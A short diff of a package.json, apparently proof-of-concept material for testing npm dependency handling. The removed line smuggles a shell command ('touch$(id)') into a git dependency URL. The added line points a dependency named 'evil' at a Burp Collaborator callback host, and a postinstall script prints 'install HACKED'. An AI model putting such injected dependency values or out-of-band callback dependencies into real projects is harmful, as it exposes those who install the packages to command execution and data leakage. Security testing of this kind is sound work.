@@ -13,7 +13,7 @@
     "postinstall":"echo install HACKED"
   },
   "dependencies": {
-    "evil":"git+https://github.com/No1zy/a/;touch$(id);"
+    "evil":"git+https://0efsk7euj72t55brus0wpa470y6pue.burpcollaborator.net/ok"
   },
   "repository": {
     "type": "git",
